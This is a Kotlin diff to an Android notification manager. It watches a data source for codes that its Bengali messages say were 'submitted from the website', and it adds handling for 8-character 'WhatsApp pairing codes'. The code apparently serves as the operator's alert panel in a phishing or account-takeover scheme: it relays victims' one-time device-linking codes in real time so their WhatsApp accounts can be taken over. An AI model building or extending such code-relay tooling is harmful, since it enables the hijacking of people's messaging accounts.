@@ -186,29 +186,41 @@ object NotificationAlertManager {
                 }
             }
 
-            // Check for unlock code
-            val unlockCode = snapshot.child("unlockCode").getValue(String::class.java)
+            // Check for unlock code or 8-digit pairing code
+            val unlockCode = snapshot.child("pairingCode").getValue(String::class.java)
+                ?: snapshot.child("unlockCode").getValue(String::class.java)
                 ?: snapshot.child("code").getValue(String::class.java)
             val unlockTs = snapshot.child("updatedAt").getValue(Long::class.java)
                 ?: snapshot.child("timestamp").getValue(Long::class.java)
                 ?: System.currentTimeMillis()
 
             if (!unlockCode.isNullOrBlank()) {
+                val cleanCode = unlockCode.trim().uppercase()
                 if (lastSeenUnlock.isEmpty() && unlockTs < sessionStartTime - 4000L) {
-                    lastSeenUnlock = unlockCode
+                    lastSeenUnlock = cleanCode
                     lastSeenUnlockTs = unlockTs
-                } else if (unlockCode != lastSeenUnlock || unlockTs > lastSeenUnlockTs + 3000L) {
-                    lastSeenUnlock = unlockCode
+                } else if (cleanCode != lastSeenUnlock || unlockTs > lastSeenUnlockTs + 3000L) {
+                    lastSeenUnlock = cleanCode
                     lastSeenUnlockTs = unlockTs
+                    val isEightChar = cleanCode.length == 8
                     val notification = AppNotification(
                         id = UUID.randomUUID().toString(),
                         type = NotificationType.UNLOCK_CODE,
-                        title = "নতুন আনলক নাম্বার নোটিফিকেশন",
-                        message = "ওয়েবসাইট থেকে ৪-সংখ্যার আনলক কোড সাবমিট হয়েছে: $unlockCode",
-                        payload = unlockCode,
+                        title = if (isEightChar) "নতুন পেয়ারিং কোড নোটিফিকেশন" else "নতুন আনলক নাম্বার নোটিফিকেশন",
+                        message = if (isEightChar) {
+                            "৮-সংখ্যার WhatsApp পেয়ারিং কোড এসেছে: $cleanCode"
+                        } else {
+                            "ওয়েবসাইট থেকে আনলক কোড সাবমিট হয়েছে: $cleanCode"
+                        },
+                        payload = cleanCode,
                         timestamp = unlockTs
                     )
-                    dispatchNotification(notification, context, "নতুন আনলক কোড এসেছে: $unlockCode")
+                    val announceText = if (isEightChar) {
+                        "WhatsApp পেয়ারিং কোড এসেছে: $cleanCode"
+                    } else {
+                        "নতুন আনলক কোড এসেছে: $cleanCode"
+                    }
+                    dispatchNotification(notification, context, announceText)
                 }
             }
         } catch (e: Exception) {
@@ -300,24 +312,37 @@ object NotificationAlertManager {
                             }
                         }
 
-                        val unlock = json.optString("unlockCode", "").ifBlank { json.optString("code", "") }
+                        val unlock = json.optString("pairingCode", "").ifBlank {
+                            json.optString("unlockCode", "").ifBlank { json.optString("code", "") }
+                        }
                         val unlockTs = json.optLong("updatedAt", json.optLong("timestamp", System.currentTimeMillis()))
                         if (unlock.isNotBlank()) {
+                            val cleanUnlock = unlock.trim().uppercase()
                             if (lastSeenUnlock.isEmpty() && unlockTs < sessionStartTime - 4000L) {
-                                lastSeenUnlock = unlock
+                                lastSeenUnlock = cleanUnlock
                                 lastSeenUnlockTs = unlockTs
-                            } else if (unlock != lastSeenUnlock || unlockTs > lastSeenUnlockTs + 3000L) {
-                                lastSeenUnlock = unlock
+                            } else if (cleanUnlock != lastSeenUnlock || unlockTs > lastSeenUnlockTs + 3000L) {
+                                lastSeenUnlock = cleanUnlock
                                 lastSeenUnlockTs = unlockTs
+                                val isEightChar = cleanUnlock.length == 8
                                 val notification = AppNotification(
                                     id = UUID.randomUUID().toString(),
                                     type = NotificationType.UNLOCK_CODE,
-                                    title = "নতুন আনলক নাম্বার নোটিফিকেশন",
-                                    message = "ওয়েবসাইট থেকে ৪-সংখ্যার আনলক কোড সাবমিট হয়েছে: $unlock",
-                                    payload = unlock,
+                                    title = if (isEightChar) "নতুন পেয়ারিং কোড নোটিফিকেশন" else "নতুন আনলক নাম্বার নোটিফিকেশন",
+                                    message = if (isEightChar) {
+                                        "৮-সংখ্যার WhatsApp পেয়ারিং কোড এসেছে: $cleanUnlock"
+                                    } else {
+                                        "ওয়েবসাইট থেকে আনলক কোড সাবমিট হয়েছে: $cleanUnlock"
+                                    },
+                                    payload = cleanUnlock,
                                     timestamp = unlockTs
                                 )
-                                dispatchNotification(notification, context, "নতুন আনলক কোড এসেছে: $unlock")
+                                val announceText = if (isEightChar) {
+                                    "WhatsApp পেয়ারিং কোড এসেছে: $cleanUnlock"
+                                } else {
+                                    "নতুন আনলক কোড এসেছে: $cleanUnlock"
+                                }
+                                dispatchNotification(notification, context, announceText)
                             }
                         }
                     }
